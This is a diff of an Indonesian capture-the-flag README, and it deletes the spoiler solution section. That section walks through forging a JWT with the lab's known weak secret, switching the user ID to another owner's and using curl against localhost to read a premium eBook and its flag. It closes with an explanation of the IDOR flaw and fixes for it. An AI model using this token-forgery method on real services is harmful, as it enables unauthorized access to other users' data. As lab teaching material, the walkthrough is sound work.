@@ -71,63 +71,9 @@ Challenge ini dibuat hanya untuk edukasi dan simulasi keamanan siber. Jangan gun
 <details><summary><h2>🏆 Solusi yang Diharapkan - (Spoiler Allert)</h2></summary>
 
 Peserta harus:
-    1. Dapatkan Token JWT Awal<br>
-    ```bash
-    curl -X POST http://localhost:4000/login \
-  -H "Content-Type: application/json" \
-  -d '{"username":"user","password":"password123"}'
-    ```
-    Contoh Response:
-    ```json
-    {
-  "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjEwMDEsInJvbGUiOiJ1c2VyIiwiaWF0IjoxNzE5NDI5NDAwLCJleHAiOjE3MTk0MzMwMDB9.4j5XW7zQl2HJYwLw7QXn2v8m6d9QkZcX6jK7vL1J3Ek"
-}
-    ```
-    2. Langkah 2: Decode Token di jwt.io
-      1. Buka https://jwt.io atau https://10015.io/tools/jwt-encoder-decoder
-      2. Paste token yang didapat:
-      ```
-      eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjEwMDEsInJvbGUiOiJ1c2VyIiwiaWF0IjoxNzE5NDI5NDAwLCJleHAiOjE3MTk0MzMwMDB9.4j5XW7zQl2HJYwLw7QXn2v8m6d9QkZcX6jK7vL1J3Ek
-      ```
-      3. Lihat payload:
-      ```json
-      {
-  "userId": 1001,
-  "role": "user",
-  "iat": 1719429400,
-  "exp": 1719433000
-}
-      ```
-   3. Ubah userId dari 1001 menjadi 9999 (pemilik eBook premium)
-      1. Ubah userId dari 1001 menjadi 9999 (pemilik eBook premium)
-      2. Gunakan secret key insecure_secret_123 untuk signature baru
-      3. Hasilkan token baru, contoh
-      ```
-      eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjk5OTksInJvbGUiOiJ1c2VyIiwiaWF0IjoxNzUwODU5MTM5LCJleHAiOjE3NTA4NjI3Mzl9.Y9OyLkfj5kBkgqqthRIcEU-LS1WR3f_EoUXk9qe3H1E
-      ```
-    4. Akses eBook Premium
-    Gunakan token yang sudah dimodifikasi:
-    ```bash
-    curl http://localhost:4000/api/ebooks/1337 \
-  -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjk5OTksInJvbGUiOiJ1c2VyIiwiaWF0IjoxNzE5NDI5NDAwLCJleHAiOjE3MTk0MzMwMDB9.1qZ3vVJkXoQ2wY8hN7Rt6cTm1x9fKsLp5UqSdW0bO4Y"
-    ```
-    Response Sukses:
-    ```bash
-    {
-  "title": "eBook Premium",
-  "content": "CTF_FLAG{JWT_IDOR_Pr3v3nt1on_1s_Key}",
-  "price": 50000
-}
-    ```
-Penjelasan Kerentanan
 
-    IDOR: Endpoint tidak memverifikasi kepemilikan resource
-    JWT Abuse: Server hanya memverifikasi signature, tidak memeriksa konsistensi data
-    Solusi Pengamanan:
-        Verifikasi ownership resource di server
-        Gunakan UUID bukan sequential ID
-        Implementasi role-based access control
-        
+
+    
 </details>
 
 ---
